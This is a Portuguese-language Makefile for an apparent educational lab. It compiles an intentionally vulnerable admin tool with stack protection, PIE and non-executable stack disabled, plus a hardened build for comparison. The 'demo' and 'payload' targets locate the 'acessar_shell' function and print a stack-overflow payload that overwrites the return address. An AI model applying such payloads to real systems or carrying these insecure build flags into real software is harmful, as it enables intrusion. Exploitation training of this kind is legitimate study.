# Makefile para compilar a ferramenta administrativa vulnerável

CC = gcc
TARGET = admin_tool
SOURCE = admin_tool.c

# Flags para tornar a vulnerabilidade explorável (apenas para fins educativos)
CFLAGS = -fno-stack-protector \
         -z execstack \
         -no-pie \
         -fno-PIE \
         -g \
         -O0 \
         -Wno-deprecated-declarations

# Regra padrão
all: $(TARGET)

# Compilar o programa vulnerável
$(TARGET): $(SOURCE)
	@echo "🔨 Compilando ferramenta administrativa vulnerável..."
	@echo "⚠️  Flags de segurança DESABILITADAS para fins educativos!"
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE)
	@echo "✅ Compilação concluída: $(TARGET)"
	@echo "🎯 Endereços importantes:"
	@objdump -t $(TARGET) | grep acessar_shell || echo "   Use objdump -t $(TARGET) para ver endereços"

# Compilar versão segura (para comparação)
secure: $(SOURCE)
	@echo "🛡️  Compilando versão SEGURA para comparação..."
	$(CC) -fstack-protector-strong -D_FORTIFY_SOURCE=2 -pie -fPIE -o $(TARGET)_secure $(SOURCE)
	@echo "✅ Versão segura criada: $(TARGET)_secure"

# Mostrar informações sobre o binário
info: $(TARGET)
	@echo "📊 INFORMAÇÕES DO BINÁRIO:"
	@echo "=========================="
	@file $(TARGET)
	@echo ""
	@echo "🎯 ENDEREÇOS DE FUNÇÕES:"
	@objdump -t $(TARGET) | grep -E "(acessar_shell|processar_comando_admin|main)"
	@echo ""
	@echo "🔍 PROTEÇÕES DE SEGURANÇA:"
	@checksec --file=$(TARGET) 2>/dev/null || echo "   Install checksec para ver proteções detalhadas"

# Demonstrar o exploit
demo: $(TARGET)
	@echo "🧪 DEMONSTRAÇÃO DE BUFFER OVERFLOW:"
	@echo "=================================="
	@echo "1. Uso normal:"
	@./$(TARGET) users
	@echo ""
	@echo "2. Comando admin normal:"
	@./$(TARGET) "admin:test"
	@echo ""
	@echo "3. ⚠️  Buffer overflow (pode crashar):"
	@echo "   Payload de exemplo (ajuste o endereço):"
	@echo "   ./$(TARGET) \"admin:\$$(python3 -c 'print(\"A\"*76 + \"BBBB\")')\""

# Gerar payload de exemplo
payload: $(TARGET)
	@echo "🎯 GERANDO PAYLOAD DE EXEMPLO:"
	@echo "============================="
	@ADDR=$$(objdump -t $(TARGET) | grep acessar_shell | cut -d' ' -f1); \
	if [ -n "$$ADDR" ]; then \
		echo "Endereço de acessar_shell: 0x$$ADDR"; \
		echo "Payload sugerido:"; \
		echo "./$(TARGET) \"admin:\$$(python3 -c 'import struct; print(\"A\"*76 + struct.pack(\"<I\", 0x$$ADDR).decode(\"latin-1\"))')\""; \
	else \
		echo "Erro: não foi possível encontrar o endereço da função"; \
	fi

# Limpar arquivos compilados
clean:
	rm -f $(TARGET) $(TARGET)_secure
	@echo "🧹 Arquivos limpos"

# Instalar dependências (para sistemas Ubuntu/Debian)
deps:
	@echo "📦 Instalando dependências para compilação 32-bit..."
	@sudo apt update
	@sudo apt install -y gcc-multilib libc6-dev-i386 gdb checksec || echo "⚠️  Execute manualmente se necessário"

# Help
help:
	@echo "🔧 FERRAMENTA ADMINISTRATIVA - MAKEFILE"
	@echo "======================================="
	@echo "Comandos disponíveis:"
	@echo "  make         - Compilar versão vulnerável"
	@echo "  make secure  - Compilar versão segura"
	@echo "  make info    - Mostrar informações do binário"
	@echo "  make demo    - Demonstração básica"
	@echo "  make payload - Gerar payload de exploit"
	@echo "  make deps    - Instalar dependências"
	@echo "  make clean   - Limpar arquivos"
	@echo ""
	@echo "⚠️  IMPORTANTE: Use apenas para fins educativos!"

.PHONY: all secure info demo payload clean deps help